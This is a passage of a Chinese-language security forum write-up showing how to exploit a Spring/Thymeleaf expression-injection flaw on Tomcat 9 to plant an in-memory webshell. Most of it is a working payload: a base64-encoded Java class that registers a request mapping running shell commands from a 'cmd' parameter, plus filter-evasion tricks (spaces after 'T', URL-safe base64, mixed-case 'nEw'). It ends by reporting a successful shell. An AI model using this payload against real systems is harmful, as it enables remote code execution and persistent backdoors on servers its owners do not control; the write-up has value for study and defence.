6AA4AAAAOAAMAEAAgABEAJQASADYAEwBIABQAVQAVAGcAFgCEABcAhwAbAIoAGACLABkAjwAaAJIAHAArAAAAUgAIACAAZwAwADEAAgA2AFEAMgAxAAMASAA/ADMANAAEAFUAMgA1ADYABQBnACAANwA4AAYAiwAHADkAOgACAAAAlAA7ADwAAAADAJEAPQA+AAEAPwAAABMAAv8AigACBwBABwBBAAEHAEIHAEMAAAAFAQA7AAAAAQAyAEQABAApAAAAaAAEAAMAAAAmuwAcWbgAHSu2AB62AB+3ACASIbYAIrYAI027ACRZLLIAJbcAJrAAAAACACoAAAAKAAIAAAAgABoAIQArAAAAIAADAAAAJgAsAC0AAAAAACYARQA+AAEAGgAMAEYAPgACAEcAAAAEAAEASABDAAAABQEARQAAAEkAAAAMAQABAEoAAQBLcwBFAAEATAAAAAIATQ=="),new javax.management.loading.MLet(new java.net.URL[0],T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0).getBean(T (Class).forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")))
```

由于绕过的需要们这里的每一个 T 的后面都要又一个 空格

### Apache Tomcat 9 url 包含特殊字符处理与替代技巧

直接打没打进去

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3c5e0fd945fdca3acbde58e668d3c09c28e4ccdf.png)​

这里返回了一个404页面，也没有任何反应，这里是因为 tomcat 在解析的时候解析了我们 base64 传入的 class 中的 `/` tomcat 会认为这是一个路径关键字，会找对应的路由，找不到就会报404

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-764b3614790eff490e718d5308a16e7eea6ab4de.png)​

但是如果我们直接进行编码的话就会报 400

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e9803e3298f7aebbff34b6fe78a6d49d04a7b92f.png)​

这里我们借助了 **org.springframework.util.Base64Utils.encodeToUrlSafeString** 这个类来避免出现这种问题，**encodeToUrlSafeString** 会将我们的 `/` 替换为 `_` 这样就避免了解析成路径的问题，我们可以这样进行替换

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a325ff7d0fc7f73baea44233cc0738ec2faf1c97.png)​

接下来仍然报错

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-57e0e9f5eb66f528ca5ad30fe32727aceac8bbd0.png)​

这里还需要绕过一个 new 关键字的检测，具体会再发一篇文章单独写调试什么的。

最终 Payload 如下：

```java
http://localhost:8080/doc/;/__${T (org.springframework.cglib.core.ReflectUtils).defineClass("SpringRequestMappingMemshell",T (org.springframework.util.Base64Utils).decodeFromUrlSafeString("yv66vgAAADQAoQoACQBRCABSCgBTAFQIAFUKAFMAVgoACQBXCAAzBwBYBwBZBwBaCgAIAFsKAAoAXAcAXQgANQcAXgoACABfBwBgCABhCgARAGIHAGMHAGQKABQAZQcAZgoAFwBnCgANAFEKAAoAaAgAaQcAagoAHABrCABsCQBtAG4KAG8AcAcAcQoAcgBzCgAhAHQIAHUKACEAdgoAIQB3BwB4CQB5AHoKACcAewEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAD3JlZ2lzdGVyTWFwcGluZwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBABhwYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBABdtZXRob2RzUmVxdWVzdENvbmRpdGlvbgEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAWQcAXgcAagEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAHwBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAqACsBAAxpbmplY3Qtc3RhcnQHAH0MAH4AfwEACGNhbGMuZXhlDACAAIEMAIIAgwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QMAIQAhQwAhgCHAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcMAIgAhQEARm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAAIvKgwAKgCJAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAAqAIoBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAAqAIsMAIwAjQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAjgArAQAMaW5qZWN0LWVycm9yBwCPDACQAJEHAJIMAJMAlAEAEWphdmEvdXRpbC9TY2FubmVyBwCVDACWAJcMACoAmAEAAlxBDACZAJoMAJsAnAEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcAnQwAngCfDAAqAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEWdldERlY2xhcmVkTWV0aG9kAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAFcHJpbnQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYAIQANAAkAAAAAAAMAAQAqACsAAQAsAAAALwABAAEAAAAFKrcAAbEAAAACAC0AAAAGAAEAAAAMAC4AAAAMAAEAAAAFAC8AMAAAAAkAMQAyAAIALAAAAXEACQAHAAAApBICTLgAAxIEtgAFVyq2AAYSBwa9AAhZAxIJU1kEEglTWQUSClO2AAtNLAS2AAwSDRIOBL0ACFkDEg9TtgAQTrsAEVkEvQAPWQMSElO3ABM6BLsAFFkDvQAVtwAWOgW7ABdZGQQZBQEBAQEBtwAYOgYsKga9AAlZAxkGU1kEuwANWbcAGVNZBS1TtgAaVxIbTKcAEk0stgAdEh5MsgAfLLYAICuwAAEAAwCQAJMAHAADAC0AAABCABAAAAAOAAMAEAAMABEAKQASAC4AEwA_ABQAUQAVAF4AFgBwABcAjQAYAJAAHQCTABkAlAAaAJgAGwCbABwAogAeAC4AAABSAAgAKQBnADMANAACAD8AUQA1ADQAAwBRAD8ANgA3AAQAXgAyADgAOQAFAHAAIAA6ADsABgCUAA4APAA9AAIAAACkAD4APwAAAAMAoQBAAEEAAQBCAAAAEwAC_wCTAAIHAEMHAEQAAQcARQ4ARgAAAAUBAD4AAAABADUARwAEACwAAABoAAQAAwAAACa7ACFZuAADK7YABbYAIrcAIxIktgAltgAmTbsAJ1kssgAotwApsAAAAAIALQAAAAoAAgAAACMAGgAkAC4AAAAgAAMAAAAmAC8AMAAAAAAAJgBIAEEAAQAaAAwASQBBAAIASgAAAAQAAQBLAEYAAAAFAQBIAAAATAAAAAwBAAEATQABAE5zAEgAAQBPAAAAAgBQ"),nEw javax.management.loading.MLet(NeW java.net.URL("http","127.0.0.1","1.txt"),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0).getBean(T (Class).forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")))}__::main.x
```

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-16be0cdf26d60800af9c40e9e1067bfde0e64d4f.png)​

![image](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a42dfcd8d7d334dd7f0e6b25e9dc17198c50fe44.png)​

成功写入内存马，getshell。